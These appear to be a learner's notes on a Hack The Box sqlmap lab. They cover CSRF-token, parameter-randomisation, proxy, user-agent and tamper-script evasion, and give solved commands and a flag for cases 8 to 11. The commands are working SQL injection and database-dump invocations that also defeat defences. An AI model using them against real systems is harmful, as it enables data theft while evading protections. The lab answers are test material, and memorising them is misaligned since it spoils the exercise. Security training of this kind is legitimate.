
### Anti-CSRF Token Bypass
```go
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

>[!Hint] Missing Token Name
> In a case where the user does not explicitly specify the token's name via `--csrf-token`, if one of the provided parameters contains any of the common infixes (i.e. `csrf`, `xsrf`, `token`), the user will be prompted whether to update it in further requests


### Unique Value Bypass

```go
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```


### Calculated Parameter Bypass

Uses the eval option to calculate a parameter value based on the expected value
```go
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

### IP Address Concealing

```go
sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"
```

Using a list of proxies:
```go
sqlmap -u "http://www.example.com/?id=1" --proxy-file="proxy_file.txt" 
```

### WAF Bypass

This test is performed automatically by SQLMap. To skip, use the `--skip-waf` command.
### User-agent Blacklisting Bypass

While running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap. Easy to bypass with the `--random-agent` switch

```go
sqlmap -u "http://www.example.com/?id=1" --random-agent
```

### Tamper Scripts

These are python scripts that help bypass WAF/IPS's. They can be chained like so:
```go
--tamper=between,randomcase
```

To list all tamper scripts and their descriptions:
```go
--list-tampers
```

# Questions

### Case 8: What's the contents of table flag8? (Case #8)

![[Pasted image 20260717092000.png]]

Token for id 1
```go
Um9gyKMMwSIFHEEPv43voAJW2XfER8RZKhna0ilwSU
```

SQLMap Command
```go
sqlmap -u "http://154.57.164.76:32129/case8.php" --data="id=1&t0ken=Um9gyKMMwSIFHEEPv43voAJW2XfER8RZKhna0ilwSU" --csrf-token="t0ken" --batch --dump
```

Answer:
```go
HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
```

### Case 9: What's the contents of table flag9? (Case #9)

```go
sqlmap -u "http://154.57.164.76:30839/case9.php?id=1&uid=2372787784" --randomize=uid --batch -v 5 --dump
```

### Case 10: What's the contents of table flag10? (Case #10)

```go
sqlmap -u "http://154.57.164.76:30839/case10.php" --random-agent --batch --data="id=1" --dump
```

### Case 11: What's the contents of table flag11? (Case #11)

```go
sqlmap -u "http://154.57.164.78:31280/case11.php?id=1" --tamper=between,randomcase --dump --batch
```

